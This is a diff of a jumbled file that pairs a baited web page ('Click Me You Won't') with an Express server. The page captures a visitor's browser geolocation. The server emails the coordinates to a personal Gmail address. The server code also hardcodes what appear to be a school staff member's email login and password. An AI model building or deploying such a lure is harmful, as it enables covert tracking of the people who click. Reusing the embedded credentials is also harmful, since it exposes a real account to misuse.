@@ -32,57 +32,84 @@
 </body>
 
 
+npm install nodemailer
+// server.js
 
+const express = require('express');
+const nodemailer = require('nodemailer');
+const bodyParser = require('body-parser');
 
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
-<body>
-    <h1>Look Below</h1>
-    <p>Please click the button to share your location.</p>
-    <button onclick="getLocation()">Click Me You Won't</button>
+const app = express();
+const port = 3000;
 
-    <p id="demo"></p>
+app.use(bodyParser.json());
 
-    <script>
-    const x = document.getElementById("demo");
+// Configure nodemailer
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: 's.clark@michaelpark.school.nz',  // Your Gmail address
+        pass: 'MPSschool2024'  // Your Gmail password or app-specific password
+    }
+});
 
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendPosition);
-        } else { 
-            x.innerHTML = "Geolocation is not supported by this browser.";
+// Route to handle location data and send email
+app.post('/save-location', (req, res) => {
+    const { latitude, longitude } = req.body;
+
+    // Compose email message
+    const mailOptions = {
+        from: 'your_email@gmail.com',
+        to: 'samxgoblin@gmail.com', // Email address where you want to receive location data
+        subject: 'User Location',
+        text: `Latitude: ${latitude}\nLongitude: ${longitude}`
+    };
+
+    // Send email
+    transporter.sendMail(mailOptions, (error, info) => {
+        if (error) {
+            console.error('Error sending email:', error);
+            res.status(500).send('Error sending email');
+        } else {
+            console.log('Email sent:', info.response);
+            res.status(200).send('Location sent successfully');
         }
-    }
+    });
+});
 
-    function sendPosition(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
+app.listen(port, () => {
+    console.log(`Server is listening at http://localhost:${port}`);
+});
 
-        // Send the location data to your server
-        fetch('/save-location', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ latitude, longitude })
-        })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Failed to send location data.');
-            }
-            return response.json();
-        })
-        .then(data => {
-            x.innerHTML = "Location sent successfully!";
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            x.innerHTML = "Failed to send location data.";
-        });
-    }
-    </script>
-</body>
-</html>
+<script>
+function sendPosition(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+
+    // Send the location data to your server
+    fetch('http://localhost:3000/save-location', { // Adjust URL accordingly if server is hosted elsewhere
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ latitude, longitude })
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to send location data.');
+        }
+        return response.text();
+    })
+    .then(data => {
+        console.log(data); // Log server response
+        x.innerHTML = "Location sent successfully!";
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        x.innerHTML = "Failed to send location data.";
+    });
+}
+</script>
+
+node server.js
+
